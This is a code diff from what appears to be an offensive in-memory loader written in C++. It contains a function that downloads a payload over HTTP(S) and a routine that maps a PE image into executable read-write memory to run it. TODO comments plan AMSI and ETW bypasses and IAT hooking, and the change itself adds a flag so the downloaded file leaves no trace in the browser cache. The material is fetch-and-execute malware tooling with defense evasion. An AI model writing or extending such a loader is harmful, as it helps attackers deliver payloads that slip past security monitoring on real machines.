@@ -17,7 +17,6 @@
 		rename("or", "InteropServices_or") // rename so c# symbols do not overwrite C++ functions/symbols
 
 // TODO: IAT hooking for arguments for both current process(affects CLR) and native loader
-// TODO: more testing on rebasing, use FIXED in compilation, or set fixed load address in virtualalloc
 // TODO: native exit function exits out of current process, hook this and fix
 // TODO: AMSI bypass before loading managed
 // TODO: ETW bypass 
@@ -60,7 +59,9 @@ char* httpStage(LPCSTR urlStr,size_t &out_size) {
 		INTERNET_FLAG_KEEP_CONNECTION,
 		0);
 
-	DWORD reqFlags = INTERNET_FLAG_RELOAD;
+	DWORD reqFlags = 0;
+	reqFlags |= INTERNET_FLAG_RELOAD; // do not request from inet cache
+	reqFlags |= INTERNET_FLAG_NO_CACHE_WRITE; // don't cache download file (C:\Users\User\AppData\Local\Microsoft\Windows\INetCache)
 	if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
 		reqFlags |= INTERNET_FLAG_SECURE;
 	}
@@ -272,10 +273,7 @@ DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** ar
 	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
 
 	// try to alloc memory for image at preferred address
-	//LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-	// debugging rebase
-	LPVOID peImageBase = VirtualAlloc((LPVOID)0x02f10000, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	// if allocation not possible at preferred address, allocate anywhere
 	if (!peImageBase) {
